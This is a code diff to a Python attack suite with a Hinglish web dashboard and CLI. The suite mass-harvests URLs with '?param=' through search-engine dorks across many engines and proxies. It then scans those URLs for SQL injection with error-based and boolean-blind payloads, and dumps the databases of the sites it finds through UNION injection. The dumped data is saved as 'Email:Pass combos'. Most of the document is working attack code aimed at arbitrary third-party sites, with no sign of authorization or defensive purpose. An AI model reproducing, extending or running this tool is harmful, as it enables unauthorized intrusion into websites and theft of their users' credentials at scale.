-    candidates = [u.strip() for u in urls if "?" in u and "=" in u and u.strip().startswith(("http://", "https://"))]
-    total = len(candidates)
+    threads = _thr(lim["sqli_threads"])
+    total = count_source_lines(urls)
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     vuln_txt = WORK_DIR / "sqli_vulns" / f"SQLi_Vulnerable_URLs_{ts}.txt"
     vuln_json = WORK_DIR / "sqli_vulns" / f"SQLi_Detailed_Report_{ts}.json"
 
     vulns: list[dict] = []
-    done_n = [0]
+    counters = {"done": 0, "errors": 0, "requests": 0}
     lk = threading.Lock()
     vfh = open(vuln_txt, "w", encoding="utf-8", buffering=1)
 
-    def _scan_one(u: str) -> None:
+    def _scan_one(raw_u: str) -> None:
         if JOB.stop_flag.is_set():
+            return
+        u = raw_u.strip()
+        if not u.startswith(("http://", "https://")) or "?" not in u or "=" not in u:
+            with lk:
+                counters["done"] += 1
             return
         p = urllib.parse.urlparse(u)
         pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
         hit_rec = None
         if pairs:
-            base_code, base_body = fast_http_fetch(u, timeout=4.0)
+            base_code, base_body = fast_http_fetch(u, timeout=5.0)
+            with lk:
+                counters["requests"] += 1
+                if base_code == 0:
+                    counters["errors"] += 1
             base_err = detect_sql_error(base_body) if base_code else ""
             for pidx, (pname, _) in enumerate(pairs[:4]):
-                for payload in ("'", "\"", "'-- -"):
+                for payload in SQLI_ERROR_PAYLOADS:
+                    if JOB.stop_flag.is_set():
+                        break
                     test_u = inject_param_value(u, pidx, payload)
-                    c1, b1 = fast_http_fetch(test_u, timeout=4.0)
+                    c1, b1 = fast_http_fetch(test_u, timeout=5.0)
+                    with lk:
+                        counters["requests"] += 1
+                        if c1 == 0:
+                            counters["errors"] += 1
                     dbms = detect_sql_error(b1)
                     if dbms and dbms != base_err:
                         hit_rec = {"url": u, "param": pname, "param_idx": pidx, "type": "Error-Based", "dbms": dbms}
                         break
                 if hit_rec:
                     break
-                # Boolean differential fallback
-                if base_code == 200 and len(base_body) > 120:
-                    t_true = inject_param_value(u, pidx, " AND 1=1-- -")
-                    t_false = inject_param_value(u, pidx, " AND 1=2-- -")
-                    ct, bt = fast_http_fetch(t_true, timeout=4.0)
-                    cf, bf_body = fast_http_fetch(t_false, timeout=4.0)
-                    if ct == 200 and cf == 200:
-                        diff_true = abs(len(bt) - len(base_body))
-                        diff_false = abs(len(bf_body) - len(base_body))
-                        if diff_true < max(40, int(len(base_body) * 0.04)) and diff_false > max(140, int(len(base_body) * 0.12)):
-                            hit_rec = {"url": u, "param": pname, "param_idx": pidx, "type": "Boolean-Blind", "dbms": "MySQL/Generic"}
+                # Boolean differential fallback (blind injection)
+                if not hit_rec and base_code == 200 and len(base_body) > 120:
+                    for tp, fp in zip(SQLI_BOOL_TRUE, SQLI_BOOL_FALSE):
+                        if JOB.stop_flag.is_set():
                             break
+                        ct, bt = fast_http_fetch(inject_param_value(u, pidx, tp), timeout=5.0)
+                        cf, bf_body = fast_http_fetch(inject_param_value(u, pidx, fp), timeout=5.0)
+                        with lk:
+                            counters["requests"] += 2
+                        if ct == 200 and cf == 200:
+                            diff_true = abs(len(bt) - len(base_body))
+                            diff_false = abs(len(bf_body) - len(base_body))
+                            if diff_true < max(40, int(len(base_body) * 0.04)) and diff_false > max(140, int(len(base_body) * 0.12)):
+                                hit_rec = {"url": u, "param": pname, "param_idx": pidx, "type": "Boolean-Blind", "dbms": "MySQL/Generic"}
+                                break
+                if hit_rec:
+                    break
 
         with lk:
-            done_n[0] += 1
+            counters["done"] += 1
             if hit_rec:
                 vulns.append(hit_rec)
                 vfh.write(hit_rec["url"] + "\n")
                 JOB.log(f"🔥 [VULN #{len(vulns)}] ({hit_rec['dbms']} • {hit_rec['type']} on `{hit_rec['param']}`) -> {hit_rec['url'][:95]}")
-            if done_n[0] % 10 == 0 or done_n[0] == total:
+            if counters["done"] % 10 == 0 or counters["done"] == total:
+                JOB.set_telemetry(
+                    scanned=counters["done"], total_dorks=total, errors=counters["errors"],
+                    threads=threads, vulns=len(vulns), requests=counters["requests"],
+                )
                 JOB.update(
-                    done=done_n[0],
+                    done=counters["done"],
                     total=max(1, total),
                     hits=len(vulns),
-                    phase=f"Scanning SQLi Endpoints ({done_n[0]:,}/{total:,})",
-                    extra=f"Confirmed Vulnerable Sites: {len(vulns):,}",
+                    phase=f"SQLi Scanner — {counters['done']:,}/{total:,} endpoints tested",
+                    extra=f"Confirmed Vulns: {len(vulns):,} | Requests: {counters['requests']:,} | Errors: {counters['errors']:,} | Threads: {threads}",
                 )
 
     try:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=lim["sqli_threads"]) as ex:
-            list(ex.map(_scan_one, candidates))
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
+            list(ex.map(_scan_one, iter_source_lines(urls)))
     finally:
         vfh.close()
 
     vuln_json.write_text(json.dumps(vulns, indent=2), encoding="utf-8")
-    JOB.add_output(vuln_txt, "Confirmed SQLi Vulnerable URLs", len(vulns), next_action="db_dump")
+    JOB.add_output(vuln_txt, f"Confirmed SQLi Vulnerable URLs ({len(vulns):,})", len(vulns), next_action="db_dump")
     return vulns
 
 
@@ -1239,12 +1503,13 @@ def _union_extract_single_target(u: str) -> dict:
             m = re.search(r"spideyx(\d{1,2})zz", body)
             if m:
                 col_count = ncol
-                inject_col = int(m.group(1)) - 1
+                # Clamp: some pages echo a different digit / duplicate marker — never crash the dumper.
+                inject_col = max(0, min(ncol - 1, int(m.group(1)) - 1))
                 break
 
     def _eval_sql(sql_expr: str) -> str:
         # 1) UNION extraction if injectable column found
-        if col_count > 0 and inject_col >= 0:
+        if col_count > 0 and 0 <= inject_col < col_count:
             cols = ["NULL"] * col_count
             cols[inject_col] = f"CONCAT(0x7e73707e,IFNULL(({sql_expr}),0x00),0x7e65647e)"
             pay = f"-999999 UNION ALL SELECT {','.join(cols)}-- -"
@@ -1302,9 +1567,9 @@ def _union_extract_single_target(u: str) -> dict:
     return result
 
 
-def run_auto_db_dumper(urls: list[str]) -> tuple[int, int]:
+def run_auto_db_dumper(urls) -> tuple[int, int]:
     lim = get_active_limits()
-    targets = [u.strip() for u in urls if u.strip().startswith(("http://", "https://"))]
+    targets = [u for u in iter_source_lines(urls) if u.startswith(("http://", "https://"))]
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     dump_dir = WORK_DIR / "db_dumps" / f"dump_run_{ts}"
     dump_dir.mkdir(parents=True, exist_ok=True)
@@ -1454,6 +1719,15 @@ def read_lines_from_payload(data: dict) -> list[str]:
 
 def read_raw_lines_exact(data: dict) -> list[str]:
     lines: list[str] = []
+    fp = str(data.get("file_path") or "").strip()
+    if fp and os.path.isfile(fp):
+        if fp.lower().endswith(".zip"):
+            lines.extend(stream_input_lines(Path(fp)))
+        else:
+            with open(fp, "r", encoding="utf-8", errors="ignore") as fh:
+                lines.extend(x.strip() for x in fh if x.strip())
+        if lines:
+            return lines
     rel = str(data.get("source_rel") or "").strip()
     if rel:
         p = (WORK_DIR / rel).resolve()
@@ -1471,6 +1745,72 @@ def read_raw_lines_exact(data: dict) -> list[str]:
     if raw_text.strip():
         lines.extend(x.strip() for x in raw_text.splitlines() if x.strip())
     return lines
+
+
+def stream_input_lines(source) -> "list[str] | object":
+    """Accepts a `Path` (disk-streamed, low RAM) or a plain list of lines."""
+    if isinstance(source, Path):
+        if source.suffix.lower() == ".zip":
+            out: list[str] = []
+            with zipfile.ZipFile(source, "r") as zf:
+                for nm in zf.namelist():
+                    if nm.lower().endswith((".txt", ".csv", ".sql", ".log")):
+                        txt = zf.read(nm).decode("utf-8", errors="ignore")
+                        out.extend(x.strip() for x in txt.splitlines() if x.strip())
+            return out
+        return source
+    return source
+
+
+def iter_source_lines(source):
+    """Yields stripped non-empty lines from either a `Path` (streamed, O(1) RAM) or a list."""
+    if isinstance(source, Path):
+        with open(source, "r", encoding="utf-8", errors="ignore") as fh:
+            for raw in fh:
+                s = raw.strip()
+                if s:
+                    yield s
+    else:
+        for raw in source:
+            s = str(raw).strip()
+            if s:
+                yield s
+
+
+def count_source_lines(source) -> int:
+    if isinstance(source, Path):
+        try:
+            with open(source, "rb") as fh:
+                return max(0, sum(1 for _ in fh))
+        except Exception:
+            return 0
+    return len(source)
+
+
+def payload_has_input(payload: dict) -> bool:
+    fp = str(payload.get("file_path") or "").strip()
+    if fp and os.path.isfile(fp) and os.path.getsize(fp) > 0:
+        return True
+    rel = str(payload.get("source_rel") or "").strip()
+    if rel:
+        cand = (WORK_DIR / rel).resolve()
+        if str(cand).startswith(str(WORK_DIR.resolve())) and cand.is_file() and cand.stat().st_size > 0:
+            return True
+    return bool(str(payload.get("text") or "").strip())
+
+
+def resolve_source(payload: dict):
+    """For SQLi/Dumper/Parser: returns a `Path` for zero-RAM streaming, else a list of lines."""
+    fp = str(payload.get("file_path") or "").strip()
+    if fp and os.path.isfile(fp):
+        return stream_input_lines(Path(fp))
+    rel = str(payload.get("source_rel") or "").strip()
+    txt = str(payload.get("text") or "").strip()
+    if rel and not txt:
+        cand = (WORK_DIR / rel).resolve()
+        if str(cand).startswith(str(WORK_DIR.resolve())) and cand.is_file():
+            return stream_input_lines(cand)
+    return read_raw_lines_exact(payload)
 
 
 def list_workspace_files(limit: int = 80) -> list[dict]:
@@ -1585,23 +1925,28 @@ def launch_module_task(action: str, payload: dict) -> tuple[bool, str]:
                 dorks = read_raw_lines_exact(payload)
                 if not dorks:
                     return
-                JOB.start("18-Engine UHQ URL Parser + DOM Spider", total=len(dorks), reinit=True)
-                p_urls, a_urls = run_parser_engine_streaming(dorks)
-                JOB.finish(f"Parsed {len(dorks):,} dorks -> {len(p_urls):,} Pure `?param=` SQLi URLs ({len(a_urls):,} total HQ URLs)!")
+                JOB.start("DEEP 16-Engine UHQ URL Parser + DOM Spider", total=len(dorks), reinit=True)
+                res = run_parser_engine_streaming(dorks)
+                st = res["stats"]
+                JOB.finish(
+                    f"Deep Parser Complete — Scanned: {st['scanned']:,}/{len(dorks):,} dorks • Raw URLs: {st['raw']:,} • "
+                    f"Unique URLs: {st['unique']:,} • Filtered: {st['filtered']:,} • Errors: {st['errors']:,} • "
+                    f"Retries: {st['retries']:,} • Threads: {st['threads']} • Pure ?param= URLs: {res['param_count']:,}"
+                )
 
             elif action == "sqli_scan":
-                urls = read_raw_lines_exact(payload)
-                if not urls:
+                urls = resolve_source(payload)
+                if not count_source_lines(urls):
                     return
-                JOB.start("Multi-Thread SQLi Vulnerability Scanner", total=len(urls), reinit=True)
+                JOB.start("Multi-Thread SQLi Vulnerability Scanner", total=count_source_lines(urls), reinit=True)
                 vulns = run_sqli_scanner(urls)
                 JOB.finish(f"SQLi Scan complete -> {len(vulns):,} confirmed vulnerable SQLi endpoints found!")
 
             elif action == "db_dump":
-                urls = read_raw_lines_exact(payload)
-                if not urls:
+                urls = resolve_source(payload)
+                if not count_source_lines(urls):
                     return
-                JOB.start("Automated SQLi DB & Combo Dumper", total=len(urls), reinit=True)
+                JOB.start("Automated SQLi DB & Combo Dumper", total=count_source_lines(urls), reinit=True)
                 sites_n, combos_n = run_auto_db_dumper(urls)
                 JOB.finish(f"DB Dump complete -> {sites_n:,} databases extracted • {combos_n:,} clean Email:Pass combos saved!")
 
@@ -1643,15 +1988,16 @@ def launch_module_task(action: str, payload: dict) -> tuple[bool, str]:
                 JOB.add_output(dk_f, "Stage 3 — UHQ SQLi Dorks", dork_count)
                 dorks_list = dk_f.read_text(encoding="utf-8").splitlines()
 
-                # Step 4: SERP + Live DOM `?param=` Parser
-                JOB.update(done=4, total=6, phase=f"[Stage 4/6] Parsing {len(dorks_list):,} Dorks Across 18 Engines + DOM Spider...")
-                param_urls, _ = run_parser_engine_streaming(dorks_list)
+                # Step 4: DEEP SERP + Live DOM `?param=` Parser
+                JOB.update(done=4, total=6, phase=f"[Stage 4/6] Deep Parsing {len(dorks_list):,} Dorks Across 16 Engines (Multi-Page) + DOM Spider...")
+                pres = run_parser_engine_streaming(dorks_list)
+                pstats = pres["stats"]
 
-                # Step 5: SQLi Vulnerability Scanner
+                # Step 5: SQLi Vulnerability Scanner (streamed straight from the parser file — zero RAM blow-up)
                 vulns = []
-                if param_urls and not JOB.stop_flag.is_set():
-                    JOB.update(done=5, total=6, phase=f"[Stage 5/6] Scanning {len(param_urls):,} `?param=` URLs for SQLi...")
-                    vulns = run_sqli_scanner(param_urls)
+                if pres["param_count"] and not JOB.stop_flag.is_set():
+                    JOB.update(done=5, total=6, phase=f"[Stage 5/6] Scanning {pres['param_count']:,} `?param=` URLs for SQLi...")
+                    vulns = run_sqli_scanner(pres["param_file"])
 
                 # Step 6: Automated DB & Combo Dumper
                 combos_n = 0
@@ -1660,7 +2006,9 @@ def launch_module_task(action: str, payload: dict) -> tuple[bool, str]:
                     _, combos_n = run_auto_db_dumper([v["url"] for v in vulns])
 
                 JOB.finish(
-                    f"Auto-Pilot Complete! Keywords: {len(best_kws):,} -> Dorks: {len(dorks_list):,} -> `?param=` URLs: {len(param_urls):,} -> SQLi Vulns: {len(vulns):,} -> Combos: {combos_n:,}"
+                    f"Auto-Pilot Complete! Keywords: {len(best_kws):,} -> Dorks: {len(dorks_list):,} -> "
+                    f"Raw URLs: {pstats['raw']:,} -> Unique: {pstats['unique']:,} -> ?param= URLs: {pres['param_count']:,} -> "
+                    f"SQLi Vulns: {len(vulns):,} -> Combos: {combos_n:,}"
                 )
         except Exception as exc:
             JOB.log(f"❌ Error: {type(exc).__name__}: {exc}")
@@ -1668,7 +2016,7 @@ def launch_module_task(action: str, payload: dict) -> tuple[bool, str]:
 
     # Validate non-empty inputs synchronously before spawning thread
     if action in ("kw_quality", "url_parser", "sqli_scan", "db_dump", "refinery"):
-        if not read_raw_lines_exact(payload):
+        if not payload_has_input(payload):
             return False, "Input is empty! Paste lines, upload a `.txt`/`.zip` file, or pick a saved workspace file from the dropdown."
 
     if not JOB.start(action.upper(), total=100):
@@ -1767,18 +2115,29 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
     <div>
       <select id="hwProfile" onchange="updateSettings()" style="width:270px">
         <option value="auto">⚡ Hardware: Auto-Detect</option>
-        <option value="low">🟢 Low (Laptop / 2–4 GB RAM)</option>
-        <option value="medium">🟡 Medium (4-Core / 8 GB RAM)</option>
-        <option value="high">🟠 High (8-Core / 16–32 GB RAM)</option>
-        <option value="beast">🔥 Beast (12+ Core / 62 GB VPS)</option>
+        <option value="low">🟢 Lite (1–2 Core / 1–4 GB Chota VPS)</option>
+        <option value="medium">🟡 Medium (2–4 Core / 4–8 GB RAM)</option>
+        <option value="high">🟠 High (6–8 Core / 12–32 GB RAM)</option>
+        <option value="beast">🔥 Beast (12+ Core / 32–64 GB RAM)</option>
       </select>
     </div>
     <div>
-      <select id="parserMode" onchange="updateSettings()" style="width:185px">
-        <option value="blitz">⚡ Parser: Blitz Fast</option>
+      <select id="parserMode" onchange="updateSettings()" style="width:180px">
+        <option value="blitz">⚡ Parser: Blitz (2 pages-calls)</option>
         <option value="balanced" selected>⚖️ Parser: Balanced UHQ</option>
-        <option value="deep">💎 Parser: Deep Harvest</option>
+        <option value="deep">💎 Parser: Deep Harvest (MAX URLs)</option>
       </select>
+    </div>
+    <div>
+      <select id="pageDepth" onchange="updateSettings()" style="width:165px">
+        <option value="1" selected>📄 Pages: 1 per engine</option>
+        <option value="2">📄 Pages: 2 per engine</option>
+        <option value="3">📄 Pages: 3 per engine</option>
+      </select>
+    </div>
+    <div title="Kam se kam 20 threads. 0 = Auto. Chota VPS par 40-60 rakho, bada par 150-300.">
+      <input type="number" id="thrOverride" min="0" max="1600" step="10" value="0"
+             onchange="updateSettings()" style="width:135px" placeholder="⚡ Threads"/>
     </div>
     <button class="btn btn-stop" onclick="stopJob()">🛑 STOP JOB</button>
   </div>
@@ -1823,6 +2182,27 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
         <div class="stat-box"><div class="stat-lbl">HITS / FOUND</div><div class="stat-val" style="color:var(--green)" id="stHits">0</div></div>
         <div class="stat-box"><div class="stat-lbl">SPEED</div><div class="stat-val" id="stRate">0.0 /s</div></div>
         <div class="stat-box"><div class="stat-lbl">ELAPSED</div><div class="stat-val" id="stTime">0.0s</div></div>
+      </div>
+
+      <!-- 🔥 DEEP PARSER TELEMETRY (competitor-grade live counters) -->
+      <div id="telPanel" style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+          <div style="font-size:12.5px;font-weight:700">🛰️ Deep Parser Live Telemetry</div>
+          <div style="font-size:11px" id="telThreadsBadge"><span class="tag-pill" style="color:var(--accent)">⚡ Threads: --</span></div>
+        </div>
+        <div class="stats-row" style="grid-template-columns:repeat(4,1fr)">
+          <div class="stat-box"><div class="stat-lbl">SCANNED DORKS</div><div class="stat-val" id="telScanned">0 / 0</div></div>
+          <div class="stat-box"><div class="stat-lbl">RAW URLs</div><div class="stat-val" style="color:var(--accent)" id="telRaw">0</div></div>
+          <div class="stat-box"><div class="stat-lbl">UNIQUE URLs</div><div class="stat-val" style="color:var(--green)" id="telUnique">0</div></div>
+          <div class="stat-box"><div class="stat-lbl">FILTERED</div><div class="stat-val" style="color:var(--amber)" id="telFiltered">0</div></div>
+        </div>
+        <div class="stats-row" style="grid-template-columns:repeat(4,1fr);margin-top:8px">
+          <div class="stat-box"><div class="stat-lbl">ERRORS</div><div class="stat-val" style="color:var(--red)" id="telErrors">0</div></div>
+          <div class="stat-box"><div class="stat-lbl">RETRIES</div><div class="stat-val" style="color:var(--amber)" id="telRetries">0</div></div>
+          <div class="stat-box"><div class="stat-lbl">THREADS</div><div class="stat-val" id="telThreads">0</div></div>
+          <div class="stat-box"><div class="stat-lbl">PURE ?param= URLs</div><div class="stat-val" style="color:var(--accent2)" id="telParam">0</div></div>
+        </div>
+        <div style="font-size:11px;color:var(--muted);margin-top:8px" id="telState">🕒 Waiting for a parser / scanner job...</div>
       </div>
 
       <!-- KEYWORD QUALITY VISUAL BREAKDOWN (Appears automatically after Quality Check!) -->
@@ -1960,13 +2340,27 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
           <p><b>🔥 STEP 3 — UHQ SQLi Dorks Banao (Module 3 • 100% Pure Offline):</b><br/>
           <code>Premium_Plus_Good</code> file select karke <code>50,000</code> se <code>500,000</code> dorks <b>🌐 Universal Mix</b> mode me generate karo (sirf 0.1s lagta hai!).</p><br/>
           <p><b>🌐 STEP 4 — Clean Proxies Load Ya Scrape Karo (Module 4):</b><br/>
-          Agar 50,000+ dorks parse karni hain to rotating HTTP/SOCKS proxies best yield deti hain — ya free Bing SERP verified proxies scrape kar lo.</p><br/>
+          Proxies <b>optional</b> hain (pehle 6 engines bina proxy bhi chalte hain). 50,000+ dorks par rotating proxies best yield deti hain — ya free Bing SERP verified proxies scrape kar lo.</p><br/>
           <p><b>🛰️ STEP 5 — 18-Engine UHQ URL Parser + Live DOM Spider (Module 5):</b><br/>
           Dorks file chala do — har second milne wali pure <code>?param=</code> SQLi URLs live disk me stream hoti rehti hain (0% data loss even if stopped!).</p><br/>
           <p><b>🦠 STEP 6 — SQLi Vulnerability Scanner (Module 6):</b><br/>
           <code>UHQ_SQLi_Param_URLs</code> ko scan karo — real MySQL / PostgreSQL / MSSQL / SQLite injectable sites <code>SQLi_Vulnerable_URLs</code> me save hongi.</p><br/>
           <p><b>💣 STEP 7 & 8 — Dual-Engine Auto DB Dumper + Combo Refinery (Modules 7 & 8):</b><br/>
           Built-in Quote-Less HEX <code>UNION + Error</code> engine (+ automatic local <code>sqlmap</code> fallback agar installed ho!) seedha <code>DATABASE() ➔ Tables ➔ Rows CSV + Clean Email:Pass Combos</code> nikal kar save kar deta hai!</p>
+          <hr style="border-color:#1f2b46;margin:16px 0"/>
+          <p><b>🖥️ CHOTA VPS / LAPTOP SETTINGS (2 GB RAM, 1–2 Core):</b><br/>
+          1. Profile: <code>🟢 Lite</code> (ya Auto)<br/>
+          2. <code>⚡ Threads</code> box me <code>40–60</code> likho (min 20 — kabhi 0/blank nahi).<br/>
+          3. <code>📄 Pages per engine</code> = <code>1</code> (2GB RAM par 2–3 pages mat rakho).<br/>
+          4. Parser mode: <code>⚖️ Balanced UHQ</code> — 50,000 dorks par bhi RAM flat rehti hai (sab disk pe stream hota hai).</p>
+          <p style="margin-top:8px"><b>📊 Counter ka matlab (jo upar telemetry me dikhta hai):</b><br/>
+          • <b>Scanned Dorks</b> = kitni dork process hui<br/>
+          • <b>Raw URLs</b> = SERP se mile SAARE links (filter se pehle)<br/>
+          • <b>Unique URLs</b> = junk hatane + dedup ke baad bache asli URLs (<code>Deep_Parser_All_URLs</code> file)<br/>
+          • <b>Filtered</b> = search-engine/ads/images/duplicate hatae gaye<br/>
+          • <b>Errors</b> = block/timeout wale engine calls<br/>
+          • <b>Retries</b> = fail hone par dusre engine se automatic dobara try (0 dork waste nahi hoti)<br/>
+          • <b>Threads</b> = live parallel workers (min 20 guaranteed)</p>
         </div>
       </div>
     </div>
@@ -2043,14 +2437,19 @@ async function stopJob() {
 }
 
 async function updateSettings() {
+  const thr = parseInt(val('thrOverride') || '0', 10) || 0;
+  if (thr > 0 && thr < 20) { alert('Minimum 20 threads chahiye bro — auto 20 set kar diya.'); document.getElementById('thrOverride').value = 20; }
   await fetch('api/settings', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
       profile: val('hwProfile'),
-      parser_mode: val('parserMode')
+      parser_mode: val('parserMode'),
+      page_depth: parseInt(val('pageDepth') || '1', 10) || 1,
+      thread_override: Math.max(0, parseInt(document.getElementById('thrOverride').value || '0', 10) || 0)
     })
   });
+  pollStatus();
 }
 
 async function uploadFile(inputEl, targetSelectId) {
@@ -2126,6 +2525,23 @@ async function pollStatus() {
     document.getElementById('stRate').textContent = `${s.rate}/s`;
     document.getElementById('stTime').textContent = `${s.elapsed}s`;
 
+    // 🔥 Deep Parser Live Telemetry
+    const t = s.telemetry || {};
+    const fmt = n => (n === undefined || n === null) ? '0' : Number(n).toLocaleString();
+    document.getElementById('telScanned').textContent = fmt(t.scanned) + ' / ' + fmt(t.total_dorks);
+    document.getElementById('telRaw').textContent = fmt(t.raw_urls);
+    document.getElementById('telUnique').textContent = fmt(t.unique_urls);
+    document.getElementById('telFiltered').textContent = fmt(t.filtered);
+    document.getElementById('telErrors').textContent = fmt(t.errors);
+    document.getElementById('telRetries').textContent = fmt(t.retries);
+    document.getElementById('telThreads').textContent = fmt(t.threads || (s.limits && s.limits.parser_threads));
+    document.getElementById('telParam').textContent = fmt(t.param_urls);
+    document.getElementById('telThreadsBadge').innerHTML =
+      `<span class="tag-pill" style="color:var(--accent)">⚡ Threads: ${fmt(t.threads || (s.limits && s.limits.parser_threads))} • ${s.limits && s.limits.profile_key ? s.limits.profile_key.toUpperCase() : 'AUTO'}</span>`;
+    document.getElementById('telState').textContent = s.running
+      ? ('⏳ ' + s.phase)
+      : ('✅ ' + (t.scanned ? 'Last run finished — Scanned ' + fmt(t.scanned) + ' dorks, ' + fmt(t.unique_urls) + ' unique URLs.' : 'Waiting for a parser / scanner job...'));
+
     const lb = document.getElementById('logBox');
     lb.textContent = (s.logs || []).join('\n');
     lb.scrollTop = lb.scrollHeight;
@@ -2151,6 +2567,8 @@ async function pollStatus() {
   if (s.limits) {
     document.getElementById('hwProfile').value = s.limits.profile_key || 'auto';
     document.getElementById('parserMode').value = s.limits.parser_mode || 'balanced';
+    document.getElementById('pageDepth').value = String(s.limits.page_depth || 1);
+    document.getElementById('thrOverride').value = String(s.limits.thread_override || 0);
   }
   await refreshFiles();
   await pollStatus();
@@ -2251,11 +2669,25 @@ class SuiteHTTPHandler(BaseHTTPRequestHandler):
             return
 
         if route.endswith("/api/settings"):
-            updated = save_settings({
-                k: data[k] for k in ("profile", "parser_mode", "use_proxies", "online_autocomplete") if k in data
-            })
-            JOB.log(f"⚙️ Updated Hardware/Engine Profile -> {updated['profile'].upper()} ({updated['parser_mode']})")
-            self._send_json({"ok": True, "settings": updated})
+            patch = {k: data[k] for k in ("profile", "parser_mode", "use_proxies", "online_autocomplete", "page_depth", "thread_override") if k in data}
+            if "thread_override" in patch:
+                try:
+                    tv = int(patch["thread_override"] or 0)
+                except Exception:
+                    tv = 0
+                patch["thread_override"] = 0 if tv <= 0 else _thr(tv)
+            if "page_depth" in patch:
+                try:
+                    patch["page_depth"] = max(1, min(3, int(patch["page_depth"] or 1)))
+                except Exception:
+                    patch["page_depth"] = 1
+            updated = save_settings(patch)
+            lim = get_active_limits()
+            JOB.log(
+                f"⚙️ Settings -> Profile: {updated['profile'].upper()} • Parser: {updated['parser_mode']} • "
+                f"Pages/engine: {updated['page_depth']} • Threads: {lim['parser_threads']} (parser) / {lim['sqli_threads']} (SQLi)"
+            )
+            self._send_json({"ok": True, "settings": updated, "limits": lim})
             return
 
         if route.endswith("/api/run"):
@@ -2270,23 +2702,110 @@ class SuiteHTTPHandler(BaseHTTPRequestHandler):
 # ==============================================================================
 # INTERACTIVE SSH / CMD TERMINAL MODE (`python3 spidey_offline_suite.py --cli`)
 # ==============================================================================
+def _cli_payload(fp: str, **extra) -> dict:
+    """If the typed value is a real file path -> stream it (0 RAM). Else treat it as pasted text."""
+    fp = (fp or "").strip().strip('"').strip("'").replace("\\", "/")
+    if fp and os.path.isfile(fp):
+        return {"file_path": os.path.abspath(fp), **extra}
+    return {"text": fp, **extra}
+
+
+def _cli_settings_menu() -> None:
+    lim = get_active_limits()
+    print("\n" + "=" * 72)
+    print("  ⚙️  ENGINE SETTINGS (chota/bada VPS ke hisaab se)")
+    print(f"  Current -> Profile: {lim['profile_key'].upper()} • Threads: {lim['parser_threads']} parser / {lim['sqli_threads']} sqli • Pages/engine: {lim['page_depth']}")
+    print("=" * 72)
+    print("  [1] 🟢 Lite    (1–2 core / 1–4 GB chota VPS)")
+    print("  [2] 🟡 Medium  (2–4 core / 4–8 GB)")
+    print("  [3] 🟠 High    (6–8 core / 12–32 GB)")
+    print("  [4] 🔥 Beast   (12+ core / 32–64 GB)")
+    print("  [5] ⚡ Auto-Detect")
+    print("  [6] 🎚️  Custom Threads (min 20)")
+    print("  [7] 📄 SERP Pages per Engine (1–3)")
+    print("  [0] ⬅️  Back")
+    c = input("👉 Choice: ").strip()
+    if c == "1":
+        save_settings({"profile": "low"})
+    elif c == "2":
+        save_settings({"profile": "medium"})
+    elif c == "3":
+        save_settings({"profile": "high"})
+    elif c == "4":
+        save_settings({"profile": "beast"})
+    elif c == "5":
+        save_settings({"profile": "auto"})
+    elif c == "6":
+        try:
+            t = int(input("🔢 Threads count (min 20, 0 = auto): ").strip() or "0")
+        except Exception:
+            t = 0
+        save_settings({"thread_override": 0 if t <= 0 else _thr(t)})
+    elif c == "7":
+        try:
+            d = int(input("📄 Pages per engine (1–3): ").strip() or "1")
+        except Exception:
+            d = 1
+        save_settings({"page_depth": max(1, min(3, d))})
+    nlim = get_active_limits()
+    print(f"✅ Saved -> Threads: {nlim['parser_threads']} parser / {nlim['sqli_threads']} sqli • Pages: {nlim['page_depth']}")
+
+
+def run_headless_autopilot(seeds: str, kw_count: int, dork_count: int) -> None:
+    """Bina browser/CLI ke poora pipeline chala kar exit — cron / screen ke liye best."""
+    lim = get_active_limits()
+    print("=" * 72)
+    print(f"🚀 HEADLESS AUTO-PILOT — {SUITE_VERSION}")
+    print(f"   Seeds      : {seeds}")
+    print(f"   Keywords   : {kw_count:,} • Dorks: {dork_count:,}")
+    print(f"   Threads    : {lim['parser_threads']} parser / {lim['sqli_threads']} SQLi • Pages/engine: {lim['page_depth']}")
+    print("=" * 72, flush=True)
+
+    ok, msg = launch_module_task("full_autopilot", {"text": seeds, "kw_count": kw_count, "dork_count": dork_count})
+    if not ok:
+        print(f"❌ {msg}")
+        return
+
+    last = ""
+    while JOB.running:
+        snap = JOB.snapshot()
+        tel = snap.get("telemetry") or {}
+        line = (
+            f"{snap['phase']} | {snap['done']:,}/{snap['total']:,} ({snap['pct']}%)"
+            + (f" | Raw: {tel.get('raw_urls', 0):,} | Unique: {tel.get('unique_urls', 0):,} | Thr: {tel.get('threads', 0)}" if tel else "")
+        )
+        if line != last:
+            sys.stdout.write("\r⏳ " + line[:200].ljust(200))
+            sys.stdout.flush()
+            last = line
+        time.sleep(0.5)
+
+    snap = JOB.snapshot()
+    print("\n\n✅ " + snap["phase"])
+    print("📄 Generated files:")
+    for out in snap["outputs"]:
+        print(f"   • {WORK_DIR / out['rel_path']}  ({out['lines']:,} lines)")
+
+
 def run_interactive_cli() -> None:
     while True:
         lim = get_active_limits()
         print("\n" + "=" * 72)
         print(f"  🕷️  {SUITE_VERSION} — INTERACTIVE TERMINAL EDITION")
         print(f"  ⚙️  Active Profile : {lim['label']}")
+        print(f"  ⚡ Threads         : {lim['parser_threads']} parser / {lim['sqli_threads']} SQLi • Pages/engine: {lim['page_depth']}")
         print(f"  📂 Output Folder  : {WORK_DIR}")
         print("=" * 72)
         print("  [1] 🧠 AI UHQ Keyword Generator        (100% Pure Offline)")
         print("  [2] 💎 Keyword Quality Checker         (100% Pure Offline)")
         print("  [3] 🔥 UHQ SQLi Dork Generator         (100% Pure Offline — Up to 50L)")
         print("  [4] 🌐 Scrape & Verify SERP Proxies    (Requires Internet)")
-        print("  [5] 🛰️ 18-Engine UHQ URL Parser        (Requires Internet / Proxies)")
+        print("  [5] 🛰️ DEEP 16-Engine UHQ URL Parser   (Multi-page • Needs Internet)")
         print("  [6] 🦠 High-Speed SQLi Vuln Scanner    (Requires Internet)")
         print("  [7] 💣 Automated DB & Combo Dumper     (Requires Internet)")
